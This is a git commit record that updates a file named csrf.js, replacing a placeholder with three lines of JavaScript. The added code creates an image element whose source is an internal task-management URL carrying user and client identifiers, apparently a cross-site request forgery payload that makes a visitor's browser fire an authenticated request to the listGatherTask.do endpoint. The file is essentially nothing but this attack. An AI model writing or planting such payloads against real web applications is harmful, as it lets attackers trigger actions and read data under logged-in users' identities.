fb548a98f2a82e6bb90e8e3bc543e6a44af0fd04
ZiYuan Han <onbpazy@163.com>
2016-07-21 09:43:55 +0800

    Update csrf.js

--- csrf.js
+++ csrf.js
@@ -1,1 +1,3 @@
-csrf
+var img = document.createElement("img")
+var s = '/default/taskMgmt/listGatherTask.do?userId=d59cb19z-36a0-4780-b2c6-2dddaebb374a&clientId=570f971z-ca02-494f-99e0-c19db2ff7374&start=1&limit=10&isDetail=true';
+img.setAttribute("src", s);
